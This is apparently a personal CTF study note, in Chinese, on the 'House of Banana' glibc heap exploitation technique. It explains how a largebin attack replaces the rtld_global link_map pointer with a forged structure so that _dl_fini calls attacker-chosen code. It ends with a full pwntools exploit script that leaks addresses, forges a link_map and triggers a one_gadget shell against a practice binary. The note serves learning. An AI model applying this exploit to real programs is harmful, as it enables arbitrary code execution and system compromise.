---
title: House of Banana
date: '2025-11-26 18:14:49'
updated: '2025-12-08 17:18:28'
---
# <font style="background-color:rgba(255, 255, 255, 0);">利用思路</font>
<font style="background-color:rgba(255, 255, 255, 0);">利用 largebin attack 将在堆上伪造的 rtld_global 结构体覆盖原有的结构体指针，从而控制到 fini_array，在 main 函数返回或者 exit 时就会执行到伪造的结构体里面的函数</font>

<font style="background-color:rgba(255, 255, 255, 0);">rtld_global 结构体：</font>

<font style="background-color:rgba(255, 255, 255, 0);">动态链接器当中用来记录已经加载了的共享库的信息的全局结构体，所以非常庞大，根本看不过来</font>

<font style="background-color:rgba(255, 255, 255, 0);">不过只需要注意这个结构体的开头：</font>

```c
struct rtld_global
{
    #endif
    /* Don't change the order of the following elements.  'dl_loaded'
     must remain the first element.  Forever.  */

    /* Non-shared code has no support for multiple namespaces.  */
    #ifdef SHARED
    # define DL_NNS 16
    #else
    # define DL_NNS 1
    #endif
    EXTERN struct link_namespaces
    {
        /* A pointer to the map for the main map.  */
        struct link_map *_ns_loaded;
        //这里其实就是link_map的头指针，也是rtld_global结构体的第一个数据
```

<font style="background-color:rgba(255, 255, 255, 0);">link_map 结构体：</font>

<font style="background-color:rgba(255, 255, 255, 0);">用于保存共享库之间的依赖关系和符号表信息，每个动态链接库都有一个，所有结构体组成一个链表</font>

<font style="background-color:rgba(255, 255, 255, 0);">主要也是看前面的部分：</font>

```c
struct link_map
  {
    /* These first few members are part of the protocol with the debugger.
       This is the same format used in SVR4.  */

    ElfW(Addr) l_addr;		/* Difference between the address in the ELF
				   file and the addresses in memory.  */
    char *l_name;		/* Absolute file name object was found in.  */
    ElfW(Dyn) *l_ld;		/* Dynamic section of the shared object.  */
    struct link_map *l_next, *l_prev; /* Chain of loaded objects.  */
    //这两个就是链表的next和prev指针
    
    /* All following members are internal to the dynamic linker.
       They may change without notice.  */

    /* This is an element which is only ever different from a pointer to
       the very same copy of this type for ld.so when it is used in more
       than one namespace.  */
    struct link_map *l_real;
    //这个是自身的指针

    /* Number of the namespace this link map belongs to.  */
    Lmid_t l_ns;

    struct libname_list *l_libname;
    /* Indexed pointers to dynamic section.
       [0,DT_NUM) are indexed by the processor-independent tags.
       [DT_NUM,DT_NUM+DT_THISPROCNUM) are indexed by the tag minus DT_LOPROC.
       [DT_NUM+DT_THISPROCNUM,DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM) are
       indexed by DT_VERSIONTAGIDX(tagvalue).
       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM,
	DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM) are indexed by
       DT_EXTRATAGIDX(tagvalue).
       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM,
	DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM) are
       indexed by DT_VALTAGIDX(tagvalue) and
       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM,
	DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM+DT_ADDRNUM)
       are indexed by DT_ADDRTAGIDX(tagvalue), see <elf.h>.  */

    ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM
		      + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];
    //这个是存放了许多关于加载相关的函数的指针
```

`<font style="background-color:rgba(255, 255, 255, 0);">_rtld_global</font>`<font style="background-color:rgba(255, 255, 255, 0);">是一个在Linux下用于动态链接的全局变量，它是一个指向</font>`<font style="background-color:rgba(255, 255, 255, 0);">struct link_map</font>`<font style="background-color:rgba(255, 255, 255, 0);">结构体的指针，代表当前进程的所有共享对象库之间的依赖关系和符号表信息</font>

<font style="background-color:rgba(255, 255, 255, 0);">该全局变量在动态链接器</font>`<font style="background-color:rgba(255, 255, 255, 0);">ld.so</font>`<font style="background-color:rgba(255, 255, 255, 0);">中定义，其作用是记录动态链接器在进程启动时加载的所有共享对象库的</font>`<font style="background-color:rgba(255, 255, 255, 0);">link_map</font>`<font style="background-color:rgba(255, 255, 255, 0);">结构体链表的头指针</font>

<font style="background-color:rgba(255, 255, 255, 0);">在动态链接过程中，当需要查找符号表信息时，动态链接器可以通过访问</font>`<font style="background-color:rgba(255, 255, 255, 0);">_rtld_global</font>`<font style="background-color:rgba(255, 255, 255, 0);">指向的</font>`<font style="background-color:rgba(255, 255, 255, 0);">link_map</font>`<font style="background-color:rgba(255, 255, 255, 0);">链表，遍历所有已加载的共享对象库，以寻找所需的符号表信息，这是动态链接的核心功能之一</font>

![](/images/3fab3612d2003511caffd006f312e7b1.png)

# <font style="background-color:rgba(255, 255, 255, 0);">动调相关</font>
```bash
p/x &_rtld_global
p *(struct rtld_global *) 0x7f45b5426040
p *(struct link_map *) 0x7f45b5427168
p/x *((_rtld_global._dl_ns[0]._ns_loaded)->l_info[26])
```

<font style="background-color:rgba(255, 255, 255, 0);"></font>

<font style="background-color:rgba(255, 255, 255, 0);">所以 house of banana 就是利用 largebin attack 来改掉 rtld_global 结构体当中的 link_map 指针，改成伪造的 link_map 结构体，从而执行里面伪造的函数</font>

<font style="background-color:rgba(255, 255, 255, 0);">接着来看这个在 main 函数返回或者调用 exit 退出时会执行到的</font>`<font style="background-color:rgba(255, 255, 255, 0);">_dl_fini</font>`<font style="background-color:rgba(255, 255, 255, 0);">函数：</font>

<font style="background-color:rgba(255, 255, 255, 0);">只用看到我们要利用的</font>`<font style="background-color:rgba(255, 255, 255, 0);">((fini_t) array[i]) ();</font>`<font style="background-color:rgba(255, 255, 255, 0);">语句（不知道为啥这里的 for 循环的花括号和循环里面的 if 判断的花括号放同一级了，为了区分还是截了 vscode 的有颜色区分的图）</font>

![](/images/8646493ae22ad8db38db11521557a41b.png)

<font style="background-color:rgba(255, 255, 255, 0);">其中比较重要的条件语句有：</font>

```c
if (l == l->l_real)
```

<font style="background-color:rgba(255, 255, 255, 0);">在这个 if 条件成立之后，maps 数组才被赋值，如果不满足的话后面就没法通过 maps 数组获得 link_map 结构体的地址会报错</font>

```c
if (l->l_init_called)
```

这个检查也要满足

![](/images/b93781e58c8eb13041ec3c6f2f97fed8.png)

但是这里比较特殊，截图这一部分是在高 4 字节，即

![](/images/1c1eee07e8eed119e9ec21dd5a4525e4.png)

要满足`l_init_called`>0，所以 payload 要传`0x800000000`

```c
if (l->l_info[DT_FINI_ARRAY] != NULL
    || (ELF_INITFINI && l->l_info[DT_FINI] != NULL))
```

```c
if (l->l_info[DT_FINI_ARRAY] != NULL)
```

<font style="background-color:rgba(255, 255, 255, 0);">这两个 if 语句其实是一个条件</font>

<font style="background-color:rgba(255, 255, 255, 0);">然后就是重点要触发的语句块了：</font>

```c
ElfW(Addr) *array =(ElfW(Addr) *) (l->l_addr + l->l_info[DT_FINI_ARRAY]->d_un.d_ptr);
unsigned int i = (l->l_info[DT_FINI_ARRAYSZ]->d_un.d_val / sizeof (ElfW(Addr)));
while (i-- > 0)
    ((fini_t) array[i]) ();
```

> 这里DT_FINI_ARRAY 和DT_FINI_ARRAYSZ 的宏定义是 26 和 28
>

<font style="background-color:rgba(255, 255, 255, 0);">这里面刚开始我还在楞</font>`<font style="background-color:rgba(255, 255, 255, 0);">d_un</font>`<font style="background-color:rgba(255, 255, 255, 0);">是什么来的，还是得搜一下源码：原来是联合类型</font>

```c
typedef struct
{
  Elf32_Sword	d_tag;			/* Dynamic entry type */
  union
    {
      Elf32_Word d_val;			/* Integer value */
      Elf32_Addr d_ptr;			/* Address value */
    } d_un;
} Elf32_Dyn;

typedef struct
{
  Elf64_Sxword	d_tag;			/* Dynamic entry type */
  union
    {
      Elf64_Xword d_val;		/* Integer value */
      Elf64_Addr d_ptr;			/* Address value */
    } d_un;
} Elf64_Dyn;
```

> 我敲，想了半天才想起来联合类型是其中一种类型的意思...还是太菜了
>

| <font style="background-color:rgba(255, 255, 255, 0);">宏/类型</font> | <font style="background-color:rgba(255, 255, 255, 0);">含义</font> | <font style="background-color:rgba(255, 255, 255, 0);">解释</font> |
| --- | --- | --- |
| `<font style="background-color:rgba(255, 255, 255, 0);">ElfW(Addr)</font>` | <font style="background-color:rgba(255, 255, 255, 0);">ELF 地址类型</font> | <font style="background-color:rgba(255, 255, 255, 0);">这是一个宏，根据当前系统架构（32位或64位）自动展开为 </font>`<font style="background-color:rgba(255, 255, 255, 0);">Elf32_Addr</font>`<br/><font style="background-color:rgba(255, 255, 255, 0);"> (4字节) 或 </font>`<font style="background-color:rgba(255, 255, 255, 0);">Elf64_Addr</font>`<br/><font style="background-color:rgba(255, 255, 255, 0);"> (8字节)。它代表一个内存地址。</font> |
| `<font style="background-color:rgba(255, 255, 255, 0);">l</font>` | <font style="background-color:rgba(255, 255, 255, 0);">链接映射结构体</font> | <font style="background-color:rgba(255, 255, 255, 0);">指向当前加载的 ELF 模块（程序或库）的链接映射结构体 (</font>`<font style="background-color:rgba(255, 255, 255, 0);">struct link_map</font>`<br/><font style="background-color:rgba(255, 255, 255, 0);">)。</font> |
| `<font style="background-color:rgba(255, 255, 255, 0);">DT_FINI_ARRAY</font>` | <font style="background-color:rgba(255, 255, 255, 0);">动态节区标签</font> | <font style="background-color:rgba(255, 255, 255, 0);">标记 </font>`<font style="background-color:rgba(255, 255, 255, 0);">.fini_array</font>`<br/><font style="background-color:rgba(255, 255, 255, 0);"> 节区的起始地址。</font> |
| `<font style="background-color:rgba(255, 255, 255, 0);">DT_FINI_ARRAYSZ</font>` | <font style="background-color:rgba(255, 255, 255, 0);">动态节区标签</font> | <font style="background-color:rgba(255, 255, 255, 0);">标记 </font>`<font style="background-color:rgba(255, 255, 255, 0);">.fini_array</font>`<br/><font style="background-color:rgba(255, 255, 255, 0);"> 节区的字节大小。</font> |
| `<font style="background-color:rgba(255, 255, 255, 0);">fini_t</font>` | <font style="background-color:rgba(255, 255, 255, 0);">函数指针类型</font> | <font style="background-color:rgba(255, 255, 255, 0);">通常定义为 </font>`<font style="background-color:rgba(255, 255, 255, 0);">void (*)(void)</font>`<br/><font style="background-color:rgba(255, 255, 255, 0);">，即不接受参数、不返回值的函数指针类型。</font> |


## 重点语句
```c
ElfW(Addr) *array =(ElfW(Addr) *) (l->l_addr + l->l_info[DT_FINI_ARRAY]->d_un.d_ptr);
```

这里可以把`l->l_addr`置 0，然后让`l->l_info[26]`指向自己，那么`l->l_info[26]->d_un.d_ptr`就是`l->l_info[27]`，所以控制这里就可以控制 array 的值了

```c
unsigned int i = (l->l_info[DT_FINI_ARRAYSZ]->d_un.d_val / sizeof (ElfW(Addr)));
```

这里也是让`l->l_info[28]`指向自己，这样的话`l->l_info[28]->d_un.d_val`就是`l->l_info[29]`，这里的值/8 就是 i 的值了



```python
#!/usr/bin/env python3

from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
log.level = 'debug'

link=process('./hob')
libc=ELF('/home/garhin/glibc-all-in-one/libs/2.27-3ubuntu1.5_amd64/libc.so.6')

gdb.attach(link)
pause()

one_gadget=[0x4f29e,0x4f2a5,0x4f302,0x10a2fc]

def add(index,size):
    link.sendlineafter('Your choice:\n', str(1))
    link.sendlineafter('index:\n', str(index))
    link.sendlineafter("Size:\n", str(size))

def show(index):
    link.sendlineafter('Your choice:\n', str(2))
    link.sendlineafter('index:\n', str(index))

def edit(index, content):
    link.sendlineafter('Your choice:\n', str(3))
    link.sendlineafter('index:\n', str(index))
    link.sendafter("context: \n",content)

def free(index):
    link.sendlineafter('Your choice:\n', str(4))
    link.sendlineafter('index:\n', str(index))

add(0,0x450)
add(1,0x80)
add(2,0x440)
free(0)
add(3,0x460)
show(0)

link.recvuntil('context: \n')
libc=u64(link.recv(6).ljust(8,b'\x00'))
# success("libc: "+hex(libc))
libc_base=libc-0x3ebca0-0x400
success("libc_base: "+hex(libc_base))
rtld_global=libc_base+0x62a060
l_next=libc_base+0x62b710
ogg=one_gadget[2]+libc_base

edit(0,b'a'*0x10)
show(0)
link.recvuntil(b'a'*0x10)
heap=u64(link.recv(6).ljust(8,b'\x00'))
# success("heap: "+hex(heap))
heap_base=heap-0x250
success("heap_base: "+hex(heap_base))

edit(0,p64(libc)+p64(libc)+p64(heap)+p64(rtld_global-0x20))
free(2)
add(4,0x500)

fake_addr=heap_base+0x740
fake_link_map=flat({
    0x8:p64(l_next), #l_next
    0x18:p64(fake_addr), #l_real
    0x100:p64(fake_addr+0x110), #info[26]
    0x108:p64(fake_addr+0x130), #info[27]
    0x110:p64(fake_addr+0x120), #info[28]
    0x118:p64(8), #info[29]
    0x120:p64(ogg), #array[0] -> one_gadget
    0x300:p64(0x800000000) #l_init_called
},filler=b"\x00")
edit(2,fake_link_map)

link.sendlineafter('Your choice:\n', str(5))

link.interactive()
```

# 总结
这个 rtld_global 结构体之前没了解过，这下学到了，不过感觉自己对动态链接相关的原理还是不够清楚，还得学

